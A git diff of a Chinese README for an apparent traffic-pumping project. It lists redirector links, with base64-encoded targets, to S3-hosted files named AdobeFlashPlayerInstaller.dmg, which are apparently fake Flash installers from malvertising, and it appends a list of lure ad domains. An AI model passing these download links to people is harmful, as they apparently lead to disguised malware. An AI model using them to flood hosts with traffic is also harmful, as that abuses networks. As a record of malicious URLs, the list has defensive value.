@@ -1,13 +1,24 @@
+# 刷流量！
 
-# 刷流量啦！
+赞助商：杭外开发者协会 流量制裁协会
 
-以下是从莫名的广告网站收集来的刷流量链接，实时更新。
+以下是从广告网站收集来的刷流量链接，仅供测试使用，链接随时更新，但不保证永久有效。
 
-| 开刷 |  链接 |
-|:---:|:---:|
-|[Link](https://meow.maomihz.com/?aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzEwMjExNTIvbDRQSWlmUC9NZldWYXZYL0Fkb2JlRmxhc2hQbGF5ZXJJbnN0YWxsZXIuZG1n)|[https://s3.amazonaws.com/1021152/l4PIifP/MfWVavX/AdobeFlashPlayerInstaller.dmg](https://s3.amazonaws.com/1021152/l4PIifP/MfWVavX/AdobeFlashPlayerInstaller.dmg)|
-|[Link](https://meow.maomihz.com/?aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tL19SbHM4VmpRMTBfQi83RjIzMERBQTU4QUZCQTQzL0Fkb2JlRmxhc2hQbGF5ZXJJbnN0YWxsZXIuZG1n)|[https://s3.amazonaws.com/_Rls8VjQ10_B/7F230DAA58AFBA43/AdobeFlashPlayerInstaller.dmg](https://s3.amazonaws.com/_Rls8VjQ10_B/7F230DAA58AFBA43/AdobeFlashPlayerInstaller.dmg)|
-|[Link](https://meow.maomihz.com/?aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tL0U0bmYvM0UwNy9EMzQ5L0Fkb2JlRmxhc2hQbGF5ZXJJbnN0YWxsZXIuZG1n)|[https://s3.amazonaws.com/E4nf/3E07/D349/AdobeFlashPlayerInstaller.dmg](https://s3.amazonaws.com/E4nf/3E07/D349/AdobeFlashPlayerInstaller.dmg)|
-|[Link](https://meow.maomihz.com/?aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzcwNDAzYTc4LTczNDUvNWUwZWFiOWMtMjY5NC00N2VmLThiMDItL0Fkb2JlRmxhc2hQbGF5ZXJJbnN0YWxsZXIuZG1n)|[https://s3.amazonaws.com/70403a78-7345/5e0eab9c-2694-47ef-8b02-/AdobeFlashPlayerInstaller.dmg](https://s3.amazonaws.com/70403a78-7345/5e0eab9c-2694-47ef-8b02-/AdobeFlashPlayerInstaller.dmg)|
-|[Link](https://meow.maomihz.com/?aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tL3VoNVJPN1JMQjBtLzU1MDg1MS8zMTUyNDQ2L0Fkb2JlRmxhc2hQbGF5ZXJJbnN0YWxsZXIuZG1n)|[https://s3.amazonaws.com/uh5RO7RLB0m/550851/3152446/AdobeFlashPlayerInstaller.dmg](https://s3.amazonaws.com/uh5RO7RLB0m/550851/3152446/AdobeFlashPlayerInstaller.dmg)|
-|[Link](https://meow.maomihz.com/?aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzEzOTg5N2NjLWU2MjUtNGE1Mi1hOTVhLTcyZjM4NGZjOC84Q0JGL0Fkb2JlRmxhc2hQbGF5ZXJJbnN0YWxsZXIuZG1n)|[https://s3.amazonaws.com/139897cc-e625-4a52-a95a-72f384fc8/8CBF/AdobeFlashPlayerInstaller.dmg](https://s3.amazonaws.com/139897cc-e625-4a52-a95a-72f384fc8/8CBF/AdobeFlashPlayerInstaller.dmg)|
+|Direct|Discovered|URL|
+|:---:|:---|:---:|
+|[Link](https://meow.maomihz.com/?aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzc5OEI2QTYxQUQ1NTIxNEYvZHZXMy9RRWIvQWRvYmVGbGFzaFBsYXllckluc3RhbGxlci5kbWc=)|03/08 04:59|https://s3.amazonaws.com/798B6A61AD55214F/dvW3/QEb/AdobeFlashPlayerInstaller.dmg|
+|[Link](https://meow.maomihz.com/?aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzEzOTg5N2NjLWU2MjUtNGE1Mi1hOTVhLTcyZjM4NGZjOC84Q0JGL0Fkb2JlRmxhc2hQbGF5ZXJJbnN0YWxsZXIuZG1n)|03/08 04:57|https://s3.amazonaws.com/139897cc-e625-4a52-a95a-72f384fc8/8CBF/AdobeFlashPlayerInstaller.dmg|
+
+
+### 附1：收集到的广告域名：
+
+|Link|
+|---|
+|[testpconly12.thereadysystemscontentsset.download](https://dns.google.com/query?name=testpconly12.thereadysystemscontentsset.download&type=A)|
+|[checksoft.yoursafestplacetocontent.review](https://dns.google.com/query?name=checksoft.yoursafestplacetocontent.review&type=A)|
+|[learn2upgrade.yoursafestcenter4contentsafegood.stream](https://dns.google.com/query?name=learn2upgrade.yoursafestcenter4contentsafegood.stream&type=A)|
+|[readynewsoft.thesoftwaresite2contenting.bid](https://dns.google.com/query?name=readynewsoft.thesoftwaresite2contenting.bid&type=A)|
+|[update2now.thesoftwaresite2contenting.bid](https://dns.google.com/query?name=update2now.thesoftwaresite2contenting.bid&type=A)|
+|[updatenew.thesoftwaresite2contenting.bid](https://dns.google.com/query?name=updatenew.thesoftwaresite2contenting.bid&type=A)|
+|[checksoft.thelinkersgoodfreeforcontents.bid](https://dns.google.com/query?name=checksoft.thelinkersgoodfreeforcontents.bid&type=A)|
+|[lastworking.thelinkersgoodfreeforcontents.bid](https://dns.google.com/query?name=lastworking.thelinkersgoodfreeforcontents.bid&type=A)|
